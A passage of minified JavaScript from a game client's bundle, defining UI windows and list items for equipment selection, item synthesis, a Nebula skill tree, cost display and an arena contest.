h=a.MasterEquipCT.ins().getMasterSuitEquipEntry(this.curPos),u=0;u<this.skilliconArr.length;u++)this.skilliconArr[u].source=h[u].icon+"_png",this.skilliconArr[u].name=h[u].id.toString()},__decorate([delayCall()],e.prototype,"updateView",null),e}(n.BaseView);e.MasterEquipChangeWin=h,window.MasterEquipChangeWin=h,__reflect(h.prototype,"MasterEquipChangeWin",[]),window.MasterEquipChangeWin=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RoleChooseMasterEntryItem=void 0;var n=i(3),o=i(0),s=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){if(this.data){var t=o.GlobalConfig.MasterSuitEquipEntryConfig[this.data];t&&(this.skillIcon.source=t.icon+"_png",this.eSkillDesc.text=t.name)}},e}(n.BaseItemRender);e.RoleChooseMasterEntryItem=s,window.RoleChooseMasterEntryItem=s,__reflect(s.prototype,"RoleChooseMasterEntryItem",[]),window.RoleChooseMasterEntryItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RoleChooseMasterEquipWin=void 0;var n=i(1),o=i(13),s=i(6),a=i(10),r=i(118),l=i(200),h=i(477),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="RoleChooseEquip2Skin",e.itemList=[],e.pos=0,e.itemType=0,e.roleSelect=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=h.RoleMasterEquipChooseItem,this.wearItem=new h.RoleMasterEquipChooseItem,this.itemGroup.addChild(this.wearItem)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.roleSelect=t[0],this.pos=t[1],this.itemType=t[2]?t[2]:0;var i=o.SubRoles.ins().getSubRoleByIndex(this.roleSelect),n=i.getMasterEquipByIndex(this.pos);this.itemList=s.BagCT.ins().getMasterEquipByPos(this.roleSelect,this.pos),this.wearItem.setUpImage(!1),this.wearItem.data=n,this.wearItem.setBtnStatu();var l=0;if(n&&0!=n.configID){this.scroll.y=170,this.scroll.height=400,this.wearItem.visible=!0,l=n.point;var h=0==a.ItemUtil.getJob(n.itemConfig)?i.job:a.ItemUtil.getJob(n.itemConfig);r.MasterEquipCT.ins().setEquipPowerDic(h,a.ItemUtil.getSubType(n.itemConfig),l)}else this.scroll.y=50,this.scroll.height=520,this.wearItem.visible=!1;this.list.dataProvider=new eui.ArrayCollection(this.itemList),this.list.validateNow(),this.eTips.visible=!this.btnGold.visible&&this.itemList.length<=0,this.btnGold.y=this.btnGold.visible?this.scroll.height+60:this.scroll.height,this.imgBg.height=this.btnGold.y+80,observe(this,this.closeThis,r.MasterEquipCT.ins().postMasterEquipChange),this.addTouchEvent(this.btnGold,this.onClick)},e.prototype.closeThis=function(){win.close(this)},e.prototype.onClick=function(t){switch(t.currentTarget){case this.btnGold:var e=r.MasterEquipCT.ins().getEquipMinLvConfig(this.pos);e&&win.open(l.MasterEquipWin,e.id),win.close(this)}},e}(n.BaseView);e.RoleChooseMasterEquipWin=u,window.RoleChooseMasterEquipWin=u,__reflect(u.prototype,"RoleChooseMasterEquipWin",[]),window.RoleChooseMasterEquipWin=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RoleMasterEquipChooseItem=void 0;var n=i(22),o=i(13),s=i(10),a=i(3),r=i(476),l=i(118),h=i(475),u=i(38),p=i(0),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.showUpimage=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.entryList.itemRenderer=h.RoleChooseMasterEntryItem,this.entryList.dataProvider=this.arc=new eui.ArrayCollection,this._isBtnStatu&&this.setBtnStatu(),this.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.onRemove,this),this.addTouchEvent(this.changeBtn,this.itemTap)},e.prototype.dataChanged=function(){if(this.data&&this.data.itemConfig){var t,e;this.itemIcon.visible=!0,this.itemIcon.data=this.data,t=this.data.att,e=this.data.point,this.power.text=gettext("评分：{0}",e);var i=s.ItemUtil.getSubType(this.data.itemConfig),a=u.EquipCT.ins().checkEquipAndTips(this.data.itemConfig.id,this.data),r=a?3532333:16663620;this.data.itemConfig.zsLevel>0?(this.levelStrText.text=gettext("转生："),this.levelText.text=gettext("{0}转{1}级",this.data.itemConfig.zsLevel,this.data.itemConfig.level||1)):this.data.itemConfig.lhLevel>0?(this.levelStrText.text=gettext("轮回："),this.levelText.text=p.GlobalConfig.SamsaraLevelConfig[this.data.itemConfig.lhLevel].lvName):(this.levelStrText.text=gettext("等级："),this.levelText.text=gettext("{0}级",this.data.itemConfig.level||1)),this.levelText.textColor=r;var h=0;if(this.now.visible=!this.showUpimage,this.data.itemConfig.job)h=s.ItemUtil.getJob(this.data.itemConfig);else{var d=win.get("RoleChooseMasterEquipWin"),c=d.roleSelect,f=o.SubRoles.ins().getSubRoleByIndex(c);h=f.job}var g=l.MasterEquipCT.ins().getEquipPowerDic(h,i);if(e>g&&this.showUpimage&&a){this.upImg.visible=!0;var m=egret.Tween.get(this.upImg,{loop:!0});m.to({y:this.upImg.y-3},250).to({y:this.upImg.y+3},250)}else this.upImg.visible=!1;0==this.itemIndex&&this.showUpimage&&a&&e>g?this.best.visible=!0:this.best.visible=!1;for(var v="",y=0;y<t.length;y++)if(0!=t[y].type){var C=n.AttributeData.getAttrStrByTypeTotem(t[y].type)+" "+n.AttributeData.getAttrValStr(t[y]);v+=C+"\n"}v=v.replace(/\n$/,""),this.attr1.textFlow=(new egret.HtmlTextParser).parser(v),u.EquipCT.ins().checkEquipAndTips(this.data.itemConfig.id,this.data)?this.changeBtn.visible=!this._isBtnStatu:this.changeBtn.visible=!1,this.updateMasterGroup()}},e.prototype.updateMasterGroup=function(){var t=this.data,e=[];t&&t.handle&&t.masterEntryArr.length&&(e=t.masterEntryArr),this.arc.source=e},e.prototype.itemTap=function(t){if(u.EquipCT.ins().checkEquipAndTips(this.data.itemConfig.id,this.data,!0)){var e=s.ItemUtil.getSubType(this.data.itemConfig);l.MasterEquipCT.ins().sendMasterEquipWear(0,this.data.handle,e),win.close(r.RoleChooseMasterEquipWin)}},e.prototype.onRemove=function(){this.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.onRemove,this),egret.Tween.removeTweens(this.upImg)},e.prototype.setUpImage=function(t){this.showUpimage=t},e.prototype.setBtnStatu=function(){this._isBtnStatu=!0,this.changeBtn&&(this.changeBtn.visible=!1,this.now.visible=!0)},e}(a.BaseItemRender);e.RoleMasterEquipChooseItem=d,window.RoleMasterEquipChooseItem=d,__reflect(d.prototype,"RoleMasterEquipChooseItem",[]),window.RoleMasterEquipChooseItem=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ComposeTipItem=e.ComposeTip=void 0;var n=i(24),o=i(19),s=i(3),a=i(1),r=i(0),l=i(39),h=i(36),u=i(4),p=i(13),d=i(80),c=i(6),f=i(31),g=i(10),m=i(62),v=i(38),y=i(2),C=i(26),T=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="equipSyntheticSkin",e.startPos=116,e.off=110,e.ANIMALS=[2080001,2080011,2080021,2080031,2080041,2080051,2080061,2080071,2080081,2080091,2080101,2080111],e.itemId=0,e.pos=0,e.openType1=0,e.isGodWing=!1,e.godWingSlot=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addChangeEvent(this.tab,this.onTabTouch),this.list.itemRenderer=b,this.list.dataProvider=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];this.addTouchEvent(this.closeBtn,this.OnClick),this.addTouchEvent(this.compose,this.OnClick),observe(this,this.cbMerge,c.BagCT.ins().postgCbMerge);var n=[];this.itemId=t[0],t[1]&&(this.pos=t[1]),t[2]&&(this.openType1=t[2],1==this.openType1?d.TotemCT.ins().isTotemOpen=1:d.TotemCT.ins().isTotemOpen=0),this.list.dataProvider=new eui.ArrayCollection(n),this.tab.selectedIndex=this.pos>=m.EquipPos.AnimalsRat?this.pos-m.EquipPos.AnimalsRat:0,e.ANIMALS_COMPOSE_ID==this.itemId&&(this.scroller.visible=!0,this.scroller.viewport.validateNow(),this.scroller.viewport.scrollH=this.scroller.viewport.contentWidth/12*(this.tab.selectedIndex>0?this.tab.selectedIndex-1:this.tab.selectedIndex),this.itemId=this.ANIMALS[this.tab.selectedIndex]);var o=r.GlobalConfig.ItemConfig[this.itemId];if(g.ItemUtil.getType(o)==l.ItemType.TYPE_16){this.isGodWing=!0;var s=r.GlobalConfig.GodWingItemConfig[this.itemId];this.godWingSlot=s.slot;for(var a=[],h=0;9>=h;h++){var u={name:gettext("{0}阶",h+1),level:h};a.push(u)}this.tab.dataProvider=new eui.ArrayCollection(a),this.tab.selectedIndex=s.level-1,this.scroller.visible=!0,this.scroller.viewport.validateNow(),this.scroller.viewport.scrollH=this.scroller.viewport.contentWidth/12*(this.tab.selectedIndex>0?this.tab.selectedIndex-1:this.tab.selectedIndex),this.itemId=s.synthesisId}var p=r.GlobalConfig.SyntheticConfig[this.itemId];if(p){this.target.data=p.target[0],this.list.dataProvider=new eui.ArrayCollection(p.cost);var f=p.cost.length-1;this.lineGrp.width=f?this.startPos+this.off*(f-1):0,this.updateRp()}},e.prototype.removeDisplay=function(){this.skin&&(d.TotemCT.ins().isTotemOpen=0,this.removeTouchEvent(this.closeBtn,this.OnClick),this.removeTouchEvent(this.compose,this.OnClick),this.removeObserve())},e.prototype.updateRp=function(){var t=this.itemId%100==0?this.itemId+1:this.itemId,e=r.GlobalConfig.ItemConfig[t];e&&this.compose.eRp&&(this.compose.eRp.visible=v.EquipCT.ins().checkUpTjItem(t))},e.prototype.OnClick=function(t){switch(t.currentTarget){case this.closeBtn:win.close(this);break;case this.compose:for(var e=r.GlobalConfig.SyntheticConfig[this.itemId],i=e.cost,n=0;n<i.length;n++)if(!o.GlobalFun.checkCost(i[n].count,i[n].id,"",!0))return;if(c.BagCT.ins().getAllSurplusCount(1)<0)return void y.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));if(1==d.TotemCT.ins().isTotemOpen)return d.TotemCT.ins().sendComposeItem(d.TotemCT.ins().isTotemOpen,this.itemId),void win.close(this);c.BagCT.ins().sendMerge(this.itemId),win.close(this)}},e.prototype.onTabTouch=function(t){if(this.scroller.visible=!0,this.isGodWing){var e=this.tab.selectedIndex+1;for(var i in r.GlobalConfig.GodWingItemConfig){var n=r.GlobalConfig.GodWingItemConfig[i];if(n.slot==this.godWingSlot&&n.level==e){this.itemId=n.synthesisId;break}}}else this.itemId=this.ANIMALS[this.tab.selectedIndex];var o=r.GlobalConfig.SyntheticConfig[this.itemId];this.target.data=o.target[0],this.list.dataProvider=new eui.ArrayCollection(o.cost);var s=o.cost.length-1;this.lineGrp.width=s?this.startPos+this.off*(s-1):0,this.updateRp()},e.prototype.cbMerge=function(){var t,e=r.GlobalConfig.SyntheticConfig[this.itemId],i=null===(t=null===e||void 0===e?void 0:e.target[0])||void 0===t?void 0:t.id;if(i){var n=c.BagCT.ins().getBagGoodsByTypeAndId(c.BagCT.BAG_TYPE_EQUIP,i);if(n){var o=r.GlobalConfig.ItemDescConfig[n.itemConfig.descIndex].subType,s=p.SubRoles.ins().getSubRoleByIndex(0),a=s.equipsData[o].item.itemConfig,l=n.itemConfig.level-v.EquipCT.ins().cutEquiplv(n)||0,h=u.ActorCC.level,d=C.ZsCT.ins().stage;if(n.itemConfig){if(!(d>=(n.itemConfig.zsLevel||0)&&h>=l))return void(5==n.quality);if(n.itemConfig.id<=((null===a||void 0===a?void 0:a.id)||0))return}sendSync(Ts.WearEquip,{handle:n.handle,pos:o,roleId:0}),win.close(this)}}},e.ANIMALS_COMPOSE_ID=208e3,e}(a.BaseView);e.ComposeTip=T,window.ComposeTip=T,__reflect(T.prototype,"ComposeTip",[]),window.ComposeTip=T;var b=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.setItem(this.itembase,this.data)},e.prototype.setItem=function(t,e){var i,o,s="";if(e.id>2&&21!=e.id){var a=r.GlobalConfig.ItemConfig[e.id],l=g.ItemUtil.getQuality2(a);s="|C:"+f.QUALITY_COLOR[l]+"&T:"+a.name,i=c.BagCT.ins().getBagGoodsCountById(c.BagCT.BAG_TYPE_EQUIP,e.id)||c.BagCT.ins().getBagGoodsCountById(c.BagCT.BAG_TYPE_OTHTER,e.id),1==d.TotemCT.ins().isTotemOpen&&d.TotemCT.ins().isTotem(e.id)&&(i=1),a.effId?t.setItemEff2(a.effId):a.icon&&t.setItemImg(RES_DIR_ITEMICON+(a.icon+".png")),t.setImgBg2("quality"+l)}else{var p=r.GlobalConfig.MoneyConfig[e.id];switch(t.setItemImg(p.icon),s="|C:"+f.QUALITY_COLOR[0]+"&T:"+p.name,e.id){case h.MoneyConst.gold:i=u.ActorCC.gold;break;case h.MoneyConst.yuanbao:i=u.ActorCC.yb;break;case h.MoneyConst.stone:i=u.ActorCC.stone}}o=e.count;var m=i>=o?4587386:16720161,v="\n|C:"+m+"&T:"+n.CommonUtils.overLength(i)+"/"+n.CommonUtils.overLength(o);t.setName(s+v)},e}(s.BaseItemRender);e.ComposeTipItem=b,window.ComposeTipItem=b,__reflect(b.prototype,"ComposeTipItem",[]),window.ComposeTipItem=b},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MoreGameView=void 0;var n=i(1),o=i(1086),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="MoreGameSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(t,e){this.list&&(this.addTouchEvent(this.closeBtn,this.onClose),e&&this.list&&(this.title.text=t,this.list.itemRenderer=o.MoreGameItem,this.list.dataProvider=new eui.ArrayCollection(e)))},e.prototype.onClose=function(t){win.close(this)},e.open=function(t){win.open("MoreGameView","更多游戏",t)},e}(n.BaseView);e.MoreGameView=s,window.MoreGameView=s,__reflect(s.prototype,"MoreGameView",[]),window.MoreGameView=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.NebulaAttrItem=void 0;var n=i(3),o=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.max.text=this.data},e}(n.BaseItemRender);e.NebulaAttrItem=o,window.NebulaAttrItem=o,__reflect(o.prototype,"NebulaAttrItem",[]),window.NebulaAttrItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.NebulaDetailWin=void 0;var n=i(1),o=i(0),s=i(4),a=i(2),r=i(27),l=i(132),h=i(482),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="nebuladetailsSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.log_list.itemRenderer=h.NebulaDetailsItem,this.log_list.dataProvider=this._datas=new eui.ArrayCollection},e.prototype.addDisplay=function(){this.updateList()},e.prototype.updateList=function(){if(l.NebulaCT.ins().nebulaStarArr.length>0){this.unactive.visible=!1;
var t=[],e=[];for(var i in l.NebulaCT.ins().nebulaStarArr){var n=1e3*l.NebulaCT.ins().nebulaStarArr[i].id+l.NebulaCT.ins().nebulaStarArr[i].lv,a=o.GlobalConfig.NebulaLevelConfig[n];if(a){if(a.attr)for(var r in a.attr){var h={type:a.attr[r].type,value:a.attr[r].value};e.push(h)}if(a.desc){var u=a.skillV>0?a.desc:a.desc[s.ActorCC.jobId-1];t.push(u)}}}var p=[];for(var i in e){var d=!1;for(var c in p)p[c].type==e[i].type&&(p[c].value+=e[i].value,d=!0);d||p.push(e[i])}var f=l.NebulaCT.ins().returnAttStr1(p);t.push(f),this._datas.source=t,this._datas.refresh()}else this.unactive.visible=!0},e.prototype.onClick=function(){var t=this;r.WarnWin.show(gettext("重置技能将消耗|C:0xFFCE0B&T:500元宝|，将会清空技能等级。\n确认重置吗？"),function(){return s.ActorCC.yb<500?void a.TipsCT.ins().showTips(gettext("元宝不足")):(l.NebulaCT.ins().setReset(),void win.close(t))},this)},e}(n.BaseView);e.NebulaDetailWin=u,window.NebulaDetailWin=u,__reflect(u.prototype,"NebulaDetailWin",[]),window.NebulaDetailWin=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.NebulaDetailsItem=void 0;var n=i(3),o=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.lb_log.text=this.data},e}(n.BaseItemRender);e.NebulaDetailsItem=o,window.NebulaDetailsItem=o,__reflect(o.prototype,"NebulaDetailsItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.NebulaLineItem=void 0;var n=i(3),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="nebulaLineItemSkin",e.widthV0=3,e.widthV1=16,e}return __extends(e,t),e.prototype.skinComplete=function(){this.setIcon()},e.prototype.dataChanged=function(){},e.prototype.setIcon=function(){this.skin&&(window.setnebulalink(this),this.validateNow(),this.setXY())},e.prototype.setXY=function(){this.anchorOffsetY=this.data?this.widthV1/2:this.widthV0/2,this.height=this.data?this.widthV1:this.widthV0},e.prototype.clear=function(){this.icon&&(this.icon.source="")},e.prototype.destroy=function(){this.icon&&(this.icon.source=null)},e}(n.BaseItemRender);e.NebulaLineItem=o,window.NebulaLineItem=o,__reflect(o.prototype,"NebulaLineItem",[]),window.NebulaLineItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.NebulaSkillItem=void 0;var n=i(3),o=i(0),s=i(4),a=i(132),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="nebulaItemSkin",e.qu=1,e.isShowSkill=!1,e.widthV=55,e.hightV=55,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.icon,this.setSelectSkillID),observe(this,this.setStarIcon,a.NebulaCT.ins().uptateNebulaData),observe(this,this.setStarIcon,a.NebulaCT.ins().uptateNebulaStartPosData),this.setHK()},e.prototype.dataChanged=function(){!this.skin},e.prototype.setHK=function(){var t,e;if(this.skin){var i=o.GlobalConfig.NebulaConfig;if(this.data){this.currentState=i[this.data].quality+"",this.validateNow(),this.qu=i[this.data].quality;var n=this.returnBg();this.iconbg.source=n||"",i[this.data]&&i[this.data].location&&(this.x=(null===(t=i[this.data])||void 0===t?void 0:t.location[0])||0,this.y=(null===(e=i[this.data])||void 0===e?void 0:e.location[1])||0);var r=a.NebulaCT.ins().returnSkillLv(this.data),l=0,h=i[this.data];l=3==h.quality?h.icon[s.ActorCC.jobId-1]:h.icon[0],0==r?this.icon.source=l+"_0_png"||!1:this.icon.source=l+"_png"||!1,a.NebulaCT.ins().isStarOrOrgin&&a.NebulaCT.ins().changeSKillID==this.data&&this.showNebulaSkillSelect(!0)}this.setXY()}},e.prototype.setXY=function(){this.isShowSkill||(this.anchorOffsetX=this.widthV/2,this.anchorOffsetY=this.hightV/2,this.set3Icons())},e.prototype.set3Icons=function(){if(this.data){var t=a.NebulaCT.ins().returnSkillLv(this.data);if(t>0&&"3"==this.currentState)for(var e=1;7>e;e++)t-1>=e&&(this["a"+e].visible=!0)}},e.prototype.setSelectSkillID=function(){a.NebulaCT.ins().isStarOrOrgin=!0,window.changeSKillID(this),a.NebulaCT.ins().changeSKillID=this.data,a.NebulaCT.ins().updateSkillIcon()},e.prototype.returnBg=function(){var t="",e=a.NebulaCT.ins().returnSkillLv(this.data),i=!1;if(this.data>1){var n=o.GlobalConfig.NebulaConfig[this.data].activate;if(n)for(var s in n){var r=Math.floor(n[s]/1e3),l=Math.floor(n[s]%10);a.NebulaCT.ins().returnSkillLv(r)>=l&&(i=!0)}else i=!0}else i=!0;switch(this.qu){case 1:if(i){t=0==e?"nebula_11":"nebula_12";var h=a.NebulaCT.ins().returnIsCanUp(this.data);t=e>0?h?"nebula_12":"nebula_13":h?"nebula_12":"nebula_11"}else t="nebula_11";break;case 2:if(i){t=0==e?"nebula_21":"nebula_22";var h=a.NebulaCT.ins().returnIsCanUp(this.data);t=e>0?h?"nebula_22":"nebula_23":h?"nebula_22":"nebula_21"}else t="nebula_21";break;case 3:if(i){t=0==e?"nebula_31":"nebula_32";var h=a.NebulaCT.ins().returnIsCanUp(this.data);t=e>0?h?"nebula_32":"nebula_33":h?"nebula_32":"nebula_31"}else t="nebula_31"}return t},e.prototype.showNebulaSkillSelect=function(t){this.chose&&(this.chose.visible=t)},e.prototype.setStarIcon=function(){a.NebulaCT.ins().isStarOrOrgin?(this.isShowSkill=!0,this.data=a.NebulaCT.ins().changeSKillID,this.setHK(),this.set3Icons()):(this.setHK(),this.set3Icons())},e.prototype.clearAll=function(){this.icon&&(this.icon.source="")},e.prototype.clear=function(){this.icon&&(this.icon.source=""),this.removeTouchEvent(this.icon,this.setSelectSkillID)},e.prototype.destroy=function(){this.icon&&(this.icon.source=null)},e}(n.BaseItemRender);e.NebulaSkillItem=r,window.NebulaSkillItem=r,__reflect(r.prototype,"NebulaSkillItem",[]),window.NebulaSkillItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CostCom=void 0;var n=i(24),o=i(1),s=i(0),a=i(36),r=i(4),l=i(30),h=i(6),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="CostComSkin",e.mIsShowXh=!0,e.mIsShowHas=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){this.mCost?this.setData(this.mCost,this.mIsShowXh,this.mIsShowHas):this.mImg||this.mlab?this.setShow(this.mImg,this.mlab,this.mIsShowXh?gettext("消耗:"):""):this.skillPoint&&this.setCoinCount(this.skillPoint),this.textColor&&(this.countLabel.textColor=this.textColor),this.addTouchEndEvent(this.icon,this.onClick)},e.prototype.setData=function(t,e,i){if(void 0===e&&(e=!0),void 0===i&&(i=!0),!this.skin)return this.mCost=t,this.mIsShowXh=e,void(this.mIsShowHas=i);this.cost=t,this.LabXh.visible=e,this.LabXh.text=e?gettext("消耗:"):"";var o=0;switch(t.id){case a.MoneyConst.gold:case a.MoneyConst.yuanbao:this.icon.source=l.RewardData.CURRENCY_RES[t.id],o=t.id==a.MoneyConst.gold?r.ActorCC.gold:r.ActorCC.yb;break;case a.MoneyConst.exp:this.icon.source=l.RewardData.CURRENCY_RES[t.id],o=r.ActorCC.exp;break;case a.MoneyConst.skillPoints:this.icon.source=l.RewardData.CURRENCY_RES[t.id],o=r.ActorCC.skillPoints;break;default:var u=s.GlobalConfig.ItemConfig[t.id];this.icon.source=u?RES_DIR_ITEMICON+u.icon+".png":"",o=i?h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_OTHTER,t.id)||0:0}var p=t.count||0,d=o>=p?2149168:16720161;this.countLabel.textFlow=i?(new egret.HtmlTextParser).parser('<font color="'+d+'"> '+n.CommonUtils.overLength(o)+"</font>/"+n.CommonUtils.overLength(p)):(new egret.HtmlTextParser).parser(""+p)},e.prototype.setMyCost=function(t){this.mCost=t},e.prototype.setShow=function(t,e,i){return void 0===i&&(i=""),this.skin?(this.LabXh.text=i,this.icon.source=t||"",void(this.countLabel.text=e||"")):(this.mImg=t,this.mlab=e,void(this.mIsShowXh=""!=i?!0:!1))},e.prototype.setCountLabelColor=function(t){this.textColor=null;var e=0;switch(t.id){case a.MoneyConst.gold:e=r.ActorCC.gold;break;case a.MoneyConst.yuanbao:e=r.ActorCC.yb;break;default:e=h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_OTHTER,t.id)||0}var i=t.count||0,n=e>=i?4247574:16720161;return this.skin?(this.countLabel.textColor=n,n):(this.textColor=n,n)},e.prototype.setCoinCount=function(t){if(!this.skin)return void(this.skillPoint=t);var e=0;switch(t){case a.MoneyConst.gold:e=r.ActorCC.gold;break;case a.MoneyConst.yuanbao:e=r.ActorCC.yb;break;case a.MoneyConst.skillPoints:e=r.ActorCC.skillPoints;break;default:e=h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_OTHTER,t)||0}this.countLabel.text=e+"",this.icon.source=l.RewardData.CURRENCY_RES[t]},e.prototype.getWidth=function(){return this.group.validateNow(),this.group.width},e.prototype.onClick=function(t){if(r.ActorCC.isLocation&&this.cost)switch(t.currentTarget){case this.icon:var e=s.GlobalConfig.ItemConfig[this.cost.id];if(!e)return;win.open("ItemDetailedWin",0,e.id,this.cost.count||1)}},e}(o.BaseView);e.CostCom=u,window.CostCom=u,__reflect(u.prototype,"CostCom",[]),window.CostCom=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestItemChoseWin=void 0;var n=i(1),o=i(74),s=i(0),a=i(1094),r=i(5),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.defaultRect=!1,e.curLimit=0,e._sn_="ContestItemChoseSkin",e.curSelIdList=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.gift.itemRenderer=a.ContestBuffItem,this.gift.dataProvider=this.eArc=new eui.ArrayCollection,this.addTouchEvent(this.get,this.onClick),this.gift.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onListTap,this),o.ContestCT.ins().curSelBuffId=0},e.prototype.addDisplay=function(){this.desc.text="",this.curSelIdList=[],this.initList()},e.prototype.initList=function(){var t=[],e=(o.ContestCT.ins().stageType,s.GlobalConfig.ProtectArenaBase.monsterBuff);if(this.curLimit=0,e){this.curLimit=e.limit;for(var i=0,n=e.id;i<n.length;i++){var a=n[i];t.push(a)}}this.eArc.replaceAll(t),this.initSel()},e.prototype.initSel=function(){var t=this.eArc.source;this.updateView(t[0]||0)},e.prototype.onListTap=function(t){var e=t.item;this.updateView(e)},e.prototype.updateView=function(t){var e=this.curSelIdList.indexOf(t);-1!=e||(this.curSelIdList.length>=this.curLimit&&this.curSelIdList.pop(),this.curSelIdList.push(t)),this.updateItemSelected();var i=o.ContestCT.ins().getBuffMonDesc(t);this.desc.textFlow=r.TextFlowMaker.generateTextFlow1(i)},e.prototype.updateItemSelected=function(){for(var t=0;t<this.gift.numChildren;t++){var e=this.gift.getChildAt(t),i=this.curSelIdList.indexOf(e.data)>-1;e.setSelect(i)}},e.prototype.onClick=function(t){for(var e=[],i=s.GlobalConfig.ProtectArenaBase.monsterBuff,n=0;n<this.curSelIdList.length;n++){var a=i.id.indexOf(this.curSelIdList[n]);a>-1&&e.push(a)}o.ContestCT.ins().sendContestBuff(e),win.close(this)},__decorate([delayCall(200)],e.prototype,"initSel",null),e}(n.BaseView);e.ContestItemChoseWin=l,window.ContestItemChoseWin=l,__reflect(l.prototype,"ContestItemChoseWin",[]),window.ContestItemChoseWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestMainWin=void 0;var n=i(1),o=i(74),s=i(261),a=i(0),r=i(12),l=i(15),h=i(2),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ContestMainSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.update,o.ContestCT.ins().postContestStatus),observe(this,this.updateRed,s.ContestRedPoint.ins().postSignRed),observe(this,this.updateRed,s.ContestRedPoint.ins().postBetRed),this.updateView(),this.updateTime(),Timer.start(1e3,0,this.updateTime,this),this.updateRed()},e.prototype.updateView=function(){for(var t=o.ContestCT.ins().stageType,e=0;e<this.viewGrp.numChildren;e++)this.viewGrp.getChildAt(e).visible=!1;t>=o.Contest_Status.Prom2?(o.ContestCT.ins().sendContestInfos(),this.ePlayoffPanel.visible=!0):t>=o.Contest_Status.Knockout?this.eRankPanel.visible=!0:this.ContestSignPanel.visible=!0},e.prototype.updateRed=function(){},e.prototype.updateTime=function(){this.ContestSignPanel.updateTime(),this.eRankPanel.updateTime(),this.ePlayoffPanel.updateTime()},e.prototype.update=function(){},e.prototype.onClick=function(t){switch(t.target){case this.help:win.open("CommonHelpWin",a.GlobalConfig.HelpInfoConfig[354].text);break;case this.shop:win.open("ShopWin","weekMarketMainPanel",2)}},e.prototype.removeDisplay=function(){win.get("ContestItemChoseWin")&&win.close("ContestItemChoseWin")},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=r.OpenSystem.ins().checkSysOpen(l.SystemType.Contest);return i||h.TipsCT.ins().showTips(r.OpenSystem.ins().getNoOpenTips(l.SystemType.Contest)),i},e}(n.BaseView);e.ContestMainWin=u,window.ContestMainWin=u,__reflect(u.prototype,"ContestMainWin",[]),window.ContestMainWin=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PlayWayItemRender=void 0;var n=i(18),o=i(5),s=i(3),a=i(0),r=i(15),l=i(78),h=i(54),u=i(131),p=i(67),d=i(174),c=i(35),f=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return 